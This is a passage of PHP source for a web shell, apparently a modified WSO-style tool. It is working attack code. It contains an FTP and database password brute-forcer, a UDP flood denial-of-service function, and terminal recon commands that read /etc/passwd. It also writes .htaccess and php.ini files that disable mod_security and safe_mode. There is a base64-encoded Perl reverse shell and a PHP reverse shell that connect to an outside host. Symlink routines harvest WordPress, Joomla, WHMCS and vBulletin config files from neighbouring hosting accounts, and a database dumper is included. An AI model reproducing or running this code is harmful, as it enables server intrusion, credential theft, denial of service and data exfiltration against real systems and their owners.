if (is_array($temp)) foreach ($temp as $line) { $line = trim($line); ++$attempts; if (bruteForce($server[0], @$server[1], $_POST['login'], $line)) {
$success++;
echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>'; }
} } echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
}
echo '<h1><font color=yellow >FTP bruteforce</font></h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '><td><label><font color=white> <input type=radio name=type value="1" checked> /etc/passwd</font></label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><font color=white><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><font color=white><input type=radio name=type value="2"> Dictionary</font></label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="Yemen"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit s s value=">>"></td></tr></form></table>';
echo '</div><br>';
yemenFooter(); } 
function yemendos() {
yemenhead();
echo '<div class=header>';
if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
echo '<center><span>| UDP DOSSIER |</span><br><br><form onSubmit="g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;" method=POST><span>Host :</span><input name="udphost" type="text"  size="25" /><span>Time :</span><input name="udptime" type="text" size="15" /><span>Port :</span><input name="udpport" type="text" size="10" /><input  type="submit" value=">>" /></form></center>';
echo "<pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' >";
if (!empty($_POST['p1']) && !empty($_POST['p2']) && !empty($_POST['p3'])) { $packets = 0; ignore_user_abort(true); $exec_time = $_POST['p2']; $time = time(); $max_time = $exec_time + $time; $host = $_POST['p1']; $portudp = $_POST['p3']; for ($i = 0;$i < 65000;$i++) {
$out.= 'X'; } while (1) {
$packets++;
if (time() > $max_time) { break;
}
$fp = fsockopen('udp://' . $host, $portudp, $errno, $errstr, 5);
if ($fp) { fwrite($fp, $out); fclose($fp);
} } echo "$packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $exec_time, 2) . " packets per second"; echo "</pre>";
}
echo '</div>';
yemenfooter(); 
} 
function yemenproc() {
yemenhead();
echo "<Div class=header>";
if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
if ($GLOBALS['sys'] == "win") { 
	$process = array(
		"System Info" => "systeminfo",
		"Active Connections" => "netstat -an",
		"Running Services" => "net start",
		"User Accounts" => "net user",
		"Show Computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
} else { 
	$process = array(
		"Process status" => "ps aux",
		"Syslog" => "cat  /etc/syslog.conf",
		"Resolv" => "cat  /etc/resolv.conf",
		"Hosts" => "cat /etc/hosts",
		"Passwd" => "cat /etc/passwd",
		"Cpuinfo" => "cat /proc/cpuinfo",
		"Version" => "cat /proc/version",
		"Sbin" => "ls -al /usr/sbin",
		"Interrupts" => "cat /proc/interrupts",
		"lsattr" => "lsattr -va",
		"Uptime" => "uptime",
		"Fstab" => "cat /etc/fstab",
		"HDD Space" => "df -h"
	);
}
if (!empty($_POST['p1'])) { echo "<form onsubmit=\"Encoder2('encod2');g('proc',null,this.c.value);return false;\"><center><font style='color:red;width:blod;font-size:16px;font-family:auto;'>~= Terminal Mod =~</font></center><input class=\"toolsInp\" type=text style='width:92.5%;padding:2px;margin:2px;color:white;' autocomplete=ON id=encod2 name=c value='' autofocus><input style='width:5%;padding:1px;' type=submit value=\">>\"></form>
<div padding=1px ><textarea class='ml1' style='height:400px;width:98%; margin-top:5px;margin-bottom:10px;border: 1px solid red;' >"; echo yemenEx($_POST['p1']); echo '</textarea></div>
<hr>
';
}
echo "<center>";
foreach ($process as $n => $link) { echo '<a href="#" onclick="g(null,null,\'' . base64_encode($link) . '\')"> |  <b>' . $n . '</b> |  </a></br></br>';
}
echo "</center>";
echo "</div>";
yemenfooter(); } function yemensafe() {
yemenhead();
echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| " . $GLOBALS['cwd'] . " |<br>";
echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
if (!empty($_POST['p2']) && isset($_POST['p2'])) { $fil = fopen($GLOBALS['cwd'] . ".htaccess", "w"); fwrite($fil, '<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>'); fclose($fil);
}
if (!empty($_POST['p1']) && isset($_POST['p1'])) { $fil = fopen($GLOBALS['cwd'] . "php.ini", "w"); fwrite($fil, 'safe_mode=OFF
disable_functions=NONE'); fclose($fil);
}
if (!empty($_POST['p3']) && isset($_POST['p3'])) { $fil = fopen($GLOBALS['cwd'] . ".htaccess", "w"); fwrite($fil, 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl'); fclose($fil);
}
echo "<br></div>";
yemenfooter(); } function yemenconnect() {
yemenhead();
$back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
echo "<div class=header><center><h3><span>| PERL AND PHP(threads) BACK CONNECT |</span></h3>";
echo "<form  onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"><span>PERL BACK CONNECT</span><br>IP: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form>";
echo "<br><form  onSubmit=\"g(null,null,'php',this.server.value,this.port.value);return false;\"><span>PHP BACK CONNECT</span><br>IP: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form></center>";
if (isset($_POST['p1'])) { function cf($f, $t) {
$w = @fopen($f, "w") or @function_exists('file_put_contents');
if ($w) { @fwrite($w, base64_decode($t)); @fclose($w);
} } if ($_POST['p1'] == 'bcp') {
cf("/tmp/bc.pl", $back_connect_p);
$out = yemenEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
echo "<pre class=ml1 style='margin-top:5px'>Successfully opened reverse shell to " . $_POST['p2'] . ":" . $_POST['p3'] . "<br>Connecting...</pre>";
@unlink("/tmp/bc.pl"); } if ($_POST['p1'] == 'php') {
@set_time_limit(0);
$ip = $_POST['p2'];
$port = $_POST['p3'];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
echo "<pre class=ml1 style='margin-top:5px'>";
if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == - 1) {
echo "Cant fork!<br>";
exit(1); } if ($pid) {
exit(0); } if (posix_setsid() == - 1) {
echo "Error: Can't setsid()<br>";
exit(1); } $daemon = 1;
} else { echo "WARNING: Failed to daemonise.  This is quite common and not fatal<br>";
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { echo "$errstr ($errno)"; exit(1);
}
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { echo "ERROR: Can't spawn shell<br>"; exit(1);
}
@stream_set_blocking($pipes[0], 0);
@stream_set_blocking($pipes[1], 0);
@stream_set_blocking($pipes[2], 0);
@stream_set_blocking($sock, 0);
echo "Successfully opened reverse shell to $ip:$port<br>";
while (1) { if (feof($sock)) {
echo "ERROR: Shell connection terminated<br>";
break; } if (feof($pipes[1])) {
echo "ERROR: Shell process terminated<br>";
break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = @stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) {
if ($debug) echo "SOCK READ<br>";
$input = fread($sock, $chunk_size);
if ($debug) echo "SOCK: $input<br>";
fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) {
if ($debug) echo "STDOUT READ<br>";
$input = fread($pipes[1], $chunk_size);
if ($debug) echo "STDOUT: $input<br>";
fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) {
if ($debug) echo "STDERR READ<br>";
$input = fread($pipes[2], $chunk_size);
if ($debug) echo "STDERR: $input<br>";
fwrite($sock, $input); }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
echo "</pre>"; }
}
echo "</div>";
yemenfooter(); } function yemenyemen() {
yemenhead();
echo "<div style='height:100%;width:100%;border: 2px solid #5BEEFF;padding-top:20px;' ><center><b><font color=white size=4 face=Georgia, Arial>Upgrade By 3Turr</br>Old version Developed by Monds & hatrk <br>respect the coders ^_^</font></b></center>";
yemenfooter(); } function yemensymlink() {
yemenhead();
$IIIIIIIIIIIl = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$IIIIIIIIIII1 = explode('/', $IIIIIIIIIIIl);
$IIIIIIIIIIIl = str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1) - 1], '', $IIIIIIIIIIIl);
echo '<div class=header><script>p1_=p2_=p3_="";</script><br><center><h3><a href=# onclick="g(\'symlink\',null,\'website\',null)">| Domains |</br> </a><a href=# onclick="g(\'symlink\',null,null,\'whole\')">| ls -n /sym| </br></a><a href=# onclick="g(\'symlink\',null,null,null,\'config\')">| Config PHP symlink | </a></h3></center>';
if (isset($_POST['p1']) && $_POST['p1'] == 'website') { echo "<center>"; $d0mains = @file("/etc/named.conf"); if (!$d0mains) {
echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } echo "<table align=center class='main'  border=0  >
<tr bgcolor=Red><td>Count</td><td>domains</td><td>users</td></tr>"; $count = 1; foreach ($d0mains as $d0main) {
if (@eregi("zone", $d0main)) { preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if (strlen(trim($domains[1][0])) > 2) {
$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
echo "<tr><td>" . $count . "</td><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
flush();
$count++; }
} } echo "</center></table>";
}
if (isset($_POST['p2']) && $_POST['p2'] == 'whole') { @set_time_limit(0); echo "<center>"; @mkdir('sym', 0777); $IIIIIIIIIIl1 = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any"; $IIIIIIIIII1I = @fopen('sym/.htaccess', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); @symlink('/', 'sym/root'); $IIIIIIIIIlIl = basename('_FILE_'); $IIIIIIIIIllI = @file('/etc/named.conf'); if (!$IIIIIIIIIllI) {
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else {
echo "<table align='center' width='40%' class='main'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) { if (@eregi('zone', $IIIIIIIIIll1)) {
preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
flush();
if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) { $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0])); $IIIIIIII1I1l = $IIIIIIIII1I1['name']; @symlink('/', 'sym/root'); $IIIIIIII1I1l = $IIIIIIIIIl11[1][0]; $IIIIIIII1I11 = '\.ir'; $IIIIIIII1lII = '\.il'; if (@eregi("$IIIIIIII1I11", $IIIIIIIIIl11[1][0]) or @eregi("$IIIIIIII1lII", $IIIIIIIIIl11[1][0])) {
$IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $IIIIIIIIIl11[1][0] . '</div>'; } echo "
<tr>
<td>
<a target='_blank' href=http://www." . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIII1I1l . ' </a>
</td>
<td>
' . $IIIIIIIII1I1['name'] . "
</td>
<td>
<a href='sym/root/home/" . $IIIIIIIII1I1['name'] . "/public_html' target='_blank'>symlink </a>
</td>

</tr>"; flush();
} }
} } echo "</center></table>";
}
if (isset($_POST['p3']) && $_POST['p3'] == 'config') { echo "<center>"; @mkdir('sym', 0777); $IIIIIIIIIIl1 = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any"; $IIIIIIIIII1I = @fopen('sym/.htaccess', 'w'); @fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); @symlink('/', 'sym/root'); $IIIIIIIIIlIl = basename('_FILE_'); $IIIIIIIIIllI = @file('/etc/named.conf'); if (!$IIIIIIIIIllI) {
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else {
echo "
<table align='center' width='40%' class='main' ><td> Domains </td><td> Script </td>";
foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) { if (@eregi('zone', $IIIIIIIIIll1)) {
preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
flush();
if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) { $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0])); $IIIIIIIII1l1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/wp-config.php'; $IIIIIIIII11I = get_headers($IIIIIIIII1l1); $IIIIIIIII11l = $IIIIIIIII11I[0]; $IIIIIIIII111 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/blog/wp-config.php'; $IIIIIIIIlIII = get_headers($IIIIIIIII111); $IIIIIIIIlIIl = $IIIIIIIIlIII[0]; $IIIIIIIIlII1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/configuration.php'; $IIIIIIIIlIlI = get_headers($IIIIIIIIlII1); $IIIIIIIIlIll = $IIIIIIIIlIlI[0]; $IIIIIIIIlIl1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/joomla/configuration.php'; $IIIIIIIIlI1I = get_headers($IIIIIIIIlIl1); $IIIIIIIIlI1l = $IIIIIIIIlI1I[0]; $IIIIIIIIlI11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/includes/config.php'; $IIIIIIIIllII = get_headers($IIIIIIIIlI11); $IIIIIIIIllIl = $IIIIIIIIllII[0]; $IIIIIIIIllI1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/vb/includes/config.php'; $IIIIIIIIlllI = get_headers($IIIIIIIIllI1); $IIIIIIIIllll = $IIIIIIIIlllI[0]; $IIIIIIIIlll1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/forum/includes/config.php'; $IIIIIIIIll1I = get_headers($IIIIIIIIlll1); $IIIIIIIIll1l = $IIIIIIIIll1I[0]; $IIIIIIIIll11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . 'public_html/clients/configuration.php'; $IIIIIIIIl1II = get_headers($IIIIIIIIll11); $IIIIIIIIl1Il = $IIIIIIIIl1II[0]; $IIIIIIIIl1I1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/support/configuration.php'; $IIIIIIIIl1II = get_headers($IIIIIIIIl1I1); $IIIIIIIIl1lI = $IIIIIIIIl1II[0]; $IIIIIIIIl1ll = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php'; $IIIIIIIIl1l1 = get_headers($IIIIIIIIl1ll); $IIIIIIIIl11I = $IIIIIIIIl1l1[0]; $IIIIIIIIl11l = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/submitticket.php'; $IIIIIIIIl111 = get_headers($IIIIIIIIl11l); $IIIIIIII1III = $IIIIIIIIl111[0]; $IIIIIIII1IIl = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php'; $IIIIIIII1II1 = get_headers($IIIIIIII1IIl); $IIIIIIII1IlI = $IIIIIIII1II1[0]; $IIIIIIII1Ill = strpos($IIIIIIIII11l, '200'); $IIIIIIII1I1I = '&nbsp;'; if (strpos($IIIIIIIII11l, '200') == true) {
$IIIIIIII1I1I = "<a href='" . $IIIIIIIII1l1 . "' target='_blank'>Wordpress</a>"; } elseif (strpos($IIIIIIIIlIIl, '200') == true) {
$IIIIIIII1I1I = "<a href='" . $IIIIIIIII111 . "' target='_blank'>Wordpress</a>"; } elseif (strpos($IIIIIIIIlIll, '200') == true and strpos($IIIIIIII1III, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIl11l . "' target='_blank'>WHMCS</a>"; } elseif (strpos($IIIIIIIIl1lI, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1I1 . "' target='_blank'>WHMCS</a>"; } elseif (strpos($IIIIIIIIl11I, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1ll . "' target='_blank'>WHMCS</a>"; } elseif (strpos($IIIIIIIIlIll, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIlII1 . "' target='_blank'>Joomla</a>"; } elseif (strpos($IIIIIIIIlI1l, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIlIl1 . "' target='_blank'>Joomla</a>"; } elseif (strpos($IIIIIIIIllIl, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIlI11 . "' target='_blank'>vBulletin</a>"; } elseif (strpos($IIIIIIIIllll, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIllI1 . "' target='_blank'>vBulletin</a>"; } elseif (strpos($IIIIIIIIll1l, '200') == true) {
$IIIIIIII1I1I = " <a href='" . $IIIIIIIIlll1 . "' target='_blank'>vBulletin</a>"; } else {
continue; } $IIIIIIII1I1l = $IIIIIIIII1I1['name']; echo '<tr><td><a href=http://www.' . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIIIIl11[1][0] . '</a></td>
<td>' . $IIIIIIII1I1I . '</td></tr>'; flush();
} }
} } echo "</center></table>";
}
echo "</div>";
yemenfooter(); } function yemensql() {
class DbClass { var $type; var $link; var $res; function DbClass($type) {
$this->type = $type; } function connect($host, $user, $pass, $dbname) {
switch ($this->type) { case 'mysql':
if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
break; case 'pgsql':
$host = explode(':', $host);
if (!$host[1]) $host[1] = 5432;
if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
break; } return false;
}
function selectdb($db) { switch ($this->type) {
case 'mysql': if (@mysql_select_db($db)) return true; break;
}
return false;
}
function query($str) { switch ($this->type) {
case 'mysql': return $this->res = @mysql_query($str);
break;
case 'pgsql': return $this->res = @pg_query($this->link, $str);
break; } return false;
}
function fetch() { $res = func_num_args() ? func_get_arg(0) : $this->res; switch ($this->type) {
case 'mysql': return @mysql_fetch_assoc($res);
break;
case 'pgsql': return @pg_fetch_assoc($res);
break; } return false;
}
function listDbs() { switch ($this->type) {
case 'mysql': return $this->query("SHOW databases");
break;
case 'pgsql': return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
break; } return false;
}
function listTables() { switch ($this->type) {
case 'mysql': return $this->res = $this->query('SHOW TABLES');
break;
case 'pgsql': return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
break; } return false;
}
function error() { switch ($this->type) {
case 'mysql': return @mysql_error();
break;
case 'pgsql': return @pg_last_error();
break; } return false;
}
function setCharset($str) { switch ($this->type) {
case 'mysql': if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link); else $this->query('SET CHARSET ' . $str); break;
case 'pgsql': return @pg_set_client_encoding($this->link, $str); break;
}
return false; } function loadFile($str) {
switch ($this->type) { case 'mysql':
return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file")); break; case 'pgsql':
$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
$r = array();
while ($i = $this->fetch()) $r[] = $i['file'];
$this->query('drop table wso2');
return array('file' => implode("
", $r));
break; } return false; } function dump($table, $fp = false) {
switch ($this->type) { case 'mysql':
$res = $this->query('SHOW CREATE TABLE `' . $table . '`');
$create = mysql_fetch_array($res);
$sql = $create[1] . ";
";
if ($fp) fwrite($fp, $sql);
else echo ($sql);
$this->query('SELECT * FROM `' . $table . '`');
$head = true;
while ($item = $this->fetch()) { $columns = array(); foreach ($item as $k => $v) {
if ($v == null) $item[$k] = "NULL";
elseif (is_numeric($v)) $item[$k] = $v;
else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
$columns[] = "`" . $k . "`"; } if ($head) {
$sql = 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES 
	(" . implode(", ", $item) . ')';
$head = false; } else $sql = "
	,(" . implode(", ", $item) . ')'; if ($fp) fwrite($fp, $sql); else echo ($sql);
}
if (!$head) if ($fp) fwrite($fp, ";
");
else echo (";
");
break; case 'pgsql':
$this->query('SELECT * FROM ' . $table);
while ($item = $this->fetch()) { $columns = array(); foreach ($item as $k => $v) {
$item[$k] = "'" . addslashes($v) . "'";
$columns[] = $k; } $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "
"; if ($fp) fwrite($fp, $sql); else echo ($sql);
}
break; } return false;
} }; $db = new DbClass($_POST['type']); if (@$_POST['p2'] == 'download') {
$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
$db->selectdb($_POST['sql_base']);
switch ($_POST['charset']) { case "Windows-1251":
$db->setCharset('cp1251'); break; case "UTF-8":
$db->setCharset('utf8'); break; case "KOI8-R":
$db->setCharset('koi8r'); break; case "KOI8-U":
$db->setCharset('koi8u'); break; case "cp866":
$db->setCharset('cp866'); break;
}
if (empty($_POST['file'])) { ob_start("ob_gzhandler", 4096); header("Content-Disposition: attachment; filename=dump.sql"); header("Content-Type: text/plain"); foreach ($_POST['tbl'] as $v) $db->dump($v); exit;
} elseif ($fp = @fopen($_POST['file'], 'w')) { foreach ($_POST['tbl'] as $v) $db->dump($v, $fp); fclose($fp); unset($_POST['p2']);
} else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>'); } yemenhead(); echo "
<div class=header>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
<td><select name='type'><option value='mysql' "; if (@$_POST['type'] == 'mysql') echo 'selected'; echo ">MySql</option><option value='pgsql' "; if (@$_POST['type'] == 'pgsql') echo 'selected'; echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value='" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "'></td>
<td><input type=text name=sql_login value='" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "'></td>
<td><input type=text name=sql_pass value='" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "'></td><td>"; $tmp = "<input type=text name=sql_base value=''>"; if (isset($_POST['sql_host'])) {
if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { switch ($_POST['charset']) {
case "Windows-1251": $db->setCharset('cp1251');
break;
case "UTF-8": $db->setCharset('utf8');
break;
case "KOI8-R": $db->setCharset('koi8r');
break;
case "KOI8-U": $db->setCharset('koi8u');
break;
case "cp866": $db->setCharset('cp866');
break; } $db->listDbs(); echo "<select name=sql_base><option value=''></option>"; while ($item = $db->fetch()) {
list($key, $value) = each($item);
echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>'; } echo '</select>';
} else echo $tmp; } else echo $tmp; echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
<td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
 s_db='" . @addslashes($_POST['sql_base']) . "';
 function fs(f) {
if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
 if(f.p1) f.p1.value='';
 if(f.p2) f.p2.value='';
 if(f.p3) f.p3.value='';
}
 }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>"; if (isset($db) && $db->link) {
echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
if (!empty($_POST['sql_base'])) { $db->selectdb($_POST['sql_base']); echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; $tbls_res = $db->listTables(); while ($item = $db->fetch($tbls_res)) {
list($key, $value) = each($item);
if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
$value = htmlspecialchars($value);
echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>"; } echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; if (@$_POST['p1'] == 'select') {
$_POST['p1'] = 'query';
$_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
$num = $db->fetch();
$pages = ceil($num['n'] / 30);
echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
echo " of $pages";
if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";
if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";
$_POST['p3']--;
if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
